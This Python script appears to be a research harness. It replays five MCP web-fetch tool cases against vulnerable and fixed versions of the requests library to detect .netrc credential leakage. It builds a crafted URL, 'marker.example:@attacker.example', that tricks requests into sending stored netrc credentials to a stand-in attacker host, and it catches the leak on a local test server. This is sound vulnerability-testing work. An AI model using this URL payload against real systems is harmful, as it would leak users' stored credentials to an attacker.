"""Run the five frozen Requests/netrc cases through the shared Host."""

from __future__ import annotations

import argparse
import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

from shared_host_runner import evidence_rows, run_shared_host_case


CASES: dict[str, dict[str, Any]] = {
    "GH-P5-046": {
        "server": "https://github.com/alexandru2882/url-text-fetcher-mcp",
        "commit": "immutable-case-source",
        "tool": "fetch_url_text",
        "task": "Call the frozen fetch_url_text Tool and report only its returned result.",
        "command": ["python3", "url_text_fetcher/mcp_server.py"],
        "cwd": "/workspace/source",
        "path": "/gh-p5-046-controlled",
        "port": 18046,
        "body_kind": "text",
        "dockerfile": "11_evaluation/rq1_gt_v1/shared_host_replay/dockerfiles/Dockerfile.GH-P5-046",
    },
    "GH-P5-066": {
        "server": "https://github.com/unclevicky/mcp-server-fetchplus",
        "commit": "immutable-case-source",
        "tool": "fetch_url",
        "task": "Call the frozen fetch_url Tool and report only its returned result.",
        "command": ["/bin/sh", "-c", "cd /tmp && exec python3 -m mcp_server_fetchplus.server"],
        "cwd": "/tmp",
        "path": "/fetchplus",
        "port": 18066,
        "body_kind": "html",
        "python_path": "/workspace/source/src",
        "dockerfile": "11_evaluation/rq1_gt_v1/shared_host_replay/dockerfiles/Dockerfile.GH-P5-066",
    },
    "GH-P5-069": {
        "server": "https://github.com/fermionoid/paper-fetcher",
        "commit": "immutable-case-source",
        "tool": "fetch_paper",
        "task": "Call the frozen fetch_paper Tool and report only its returned result.",
        "command": [
            "/bin/sh", "-c",
            "cd /tmp && exec python3 -c \"import os; import paper_fetcher.auth as auth; auth.TEST_URL=os.environ['PAPER_FETCHER_TEST_URL']; from paper_fetcher.mcp_server import main; main()\"",
        ],
        "cwd": "/tmp",
        "path": "/paper",
        "port": 18069,
        "body_kind": "html",
        "dockerfile": "11_evaluation/rq1_gt_v1/shared_host_replay/dockerfiles/Dockerfile.GH-P5-069",
    },
    "GH-P5-113": {
        "server": "https://github.com/wzx11223344/mcp-web-scraper",
        "commit": "c275703750d4a91db1749fe6b8d5981f890a5f64",
        "tool": "fetch_webpage",
        "task": "Call the frozen fetch_webpage Tool with the URL and report only its returned result.",
        "command": ["python", "/workspace/source/server.py"],
        "cwd": "/workspace/source",
        "path": "/gh-p5-113-controlled-page",
        "port": 18113,
        "body_kind": "html",
        "dockerfile": "11_evaluation/rq1_gt_v1/shared_host_replay/dockerfiles/Dockerfile.GH-P5-113",
    },
    "GH-P5-124": {
        "server": "https://github.com/navin4078/mcp-web-scraper",
        "commit": "7a097f25e0b56d04af8e37d1178b6e194ec5d012",
        "tool": "scrape_website",
        "task": "Call the frozen scrape_website Tool with the URL and report only its returned result.",
        "command": ["python", "/workspace/source/app_mcp.py"],
        "cwd": "/workspace/source",
        "path": "/gh-p5-124-controlled-page",
        "port": 18124,
        "body_kind": "html",
        "dockerfile": "11_evaluation/rq1_gt_v1/shared_host_replay/dockerfiles/Dockerfile.GH-P5-124",
    },
}


class Boundary:
    def __init__(self, port: int, body_kind: str) -> None:
        self.requests: list[dict[str, Any]] = []
        boundary = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:  # noqa: N802
                headers = {key.lower(): value for key, value in self.headers.items()}
                boundary.requests.append({"method": "GET", "path": self.path, "headers": headers})
                authorization = headers.get("authorization", "")
                if body_kind == "text":
                    body = f"controlled response authorization={authorization}".encode("utf-8")
                    content_type = "text/plain; charset=utf-8"
                else:
                    body = (
                        "<html><head><title>controlled response</title></head>"
                        f"<body>authorization={authorization}</body></html>"
                    ).encode("utf-8")
                    content_type = "text/html; charset=utf-8"
                self.send_response(200)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args: object) -> None:
                return

        self.server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

    def snapshot(self) -> dict[str, Any]:
        return {
            "kind": "container-local-controlled-http-boundary",
            "network": "none",
            "port": self.server.server_port,
            "requests": list(self.requests),
        }


def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=True, indent=2) + "\n", encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--case", choices=sorted(CASES), required=True)
    parser.add_argument("--side", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--repetition", type=int, choices=(1, 2, 3), required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    config = CASES[args.case]
    boundary = Boundary(config["port"], config["body_kind"])
    boundary.start()
    try:
        home = Path("/tmp/gt-home")
        home.mkdir(parents=True, exist_ok=True)
        netrc = home / ".netrc"
        netrc.write_text("machine marker.example login runtime_user password runtime_password\n", encoding="utf-8")
        netrc.chmod(0o600)
        dep_root = f"/opt/deps/{args.side}"
        dependency_paths = "/opt/deps/common:/opt/deps/mcp_legacy:/opt/deps/fetchplus:/opt/deps/paper_common"
        if args.case == "GH-P5-066":
            dependency_paths = "/opt/deps/mcp_legacy:/opt/deps/fetchplus:/opt/deps/common:/opt/deps/paper_common"
        env = {
            "PYTHONPATH": f"{dep_root}:{dependency_paths}:{config.get('python_path', '/workspace/source')}:/opt/gt",
            "PATH": "/usr/local/bin:/usr/bin:/bin",
            "HOME": str(home),
            "NETRC": str(netrc),
            "NO_PROXY": "*",
            "no_proxy": "*",
            "HTTP_PROXY": "",
            "HTTPS_PROXY": "",
            "ALL_PROXY": "",
            "http_proxy": "",
            "https_proxy": "",
            "all_proxy": "",
            "PYTHONIOENCODING": "utf-8",
            "PYTHONWARNINGS": "ignore",
        }
        if args.case == "GH-P5-069":
            env["PAPER_FETCHER_TEST_URL"] = f"http://127.0.0.1:{config['port']}/session"
            (home / ".paper-fetcher").mkdir(parents=True, exist_ok=True)
            (home / ".paper-fetcher" / "config.json").write_text(
                json.dumps({"proxy_base": "", "email": "", "output_dir": str(home / ".paper-fetcher" / "papers"), "cache_dir": str(home / ".paper-fetcher" / "cache"), "cookie_path": str(home / ".paper-fetcher" / "cookies.json"), "chrome_profile_dir": str(home / ".paper-fetcher" / "chrome-profile"), "request_delay_min": 0, "request_delay_max": 0}) + "\n",
                encoding="utf-8",
            )
            (home / ".paper-fetcher" / "cookies.json").write_text("[]\n", encoding="utf-8")
        tool_input: dict[str, Any] = {"url": f"http://marker.example:@attacker.example:{config['port']}{config['path']}"}
        if args.case == "GH-P5-069":
            tool_input = {"identifier": tool_input["url"], "format": "markdown"}
        elif args.case == "GH-P5-113":
            tool_input["timeout"] = 10
        elif args.case == "GH-P5-124":
            tool_input = {"extract_type": "text", "max_results": 10, "url": tool_input["url"]}
        record = run_shared_host_case(
            run_id=f"{args.case}-{args.side}-{args.repetition}",
            case_id=args.case,
            revision=args.side,
            repetition=args.repetition,
            command=config["command"],
            cwd=Path(config["cwd"]),
            env=env,
            server_name=config["server"],
            tool_name=config["tool"],
            tool_arguments=tool_input,
            task=config["task"],
            system_prompt="You are a deterministic research host. Use the frozen tool call and report only its returned result.",
            server_revision=f"{config['commit']};requests=={'2.32.3' if args.side == 'vulnerable' else '2.32.4'}",
            timeout=90.0,
            startup_timeout=30.0,
        )
        record["external_boundary"] = boundary.snapshot()
        netrc_authorization = "Basic " + base64.b64encode(b"runtime_user:runtime_password").decode("ascii")
        netrc_transmissions = [
            item for item in boundary.requests
            if str((item.get("headers") or {}).get("authorization", "")) == netrc_authorization
        ]
        record["external_boundary"]["oracle"] = {
            "kind": "http-credential-provenance/v1",
            "complete": True,
            "credential_source": "netrc",
            "request_count": len(boundary.requests),
            "netrc_credential_transmission_count": len(netrc_transmissions),
            "effect_event": ({
                "resource_id": "http-boundary:netrc-credential-recipient",
                "operation": "send",
                "location": "container-local-controlled-http-boundary",
                "oracle_kind": "http-credential-provenance/v1",
                "stable_resource_identity": True,
            } if netrc_transmissions else None),
        }
        record["runtime_dependency"] = {"name": "requests", "purl": "pkg:pypi/requests", "version": "2.32.3" if args.side == "vulnerable" else "2.32.4", "dependency_depth": 1, "dependency_scope": "runtime", "import_root": dep_root}
        write_json(args.output / "host_record.json", record)
        (args.output / "evidence.jsonl").write_text("".join(json.dumps(row, ensure_ascii=True) + "\n" for row in evidence_rows(record)), encoding="utf-8")
        write_json(args.output / "boundary_snapshot.json", record["external_boundary"])
        valid = not record["quality"]["invalid_run"] and all(value == "observed" for value in record["evidence_levels"].values())
        print(json.dumps({"status": "OK" if valid else "INVALID", "output": str(args.output)}, ensure_ascii=True))
        return 0 if valid else 1
    finally:
        boundary.close()


if __name__ == "__main__":
    raise SystemExit(main())
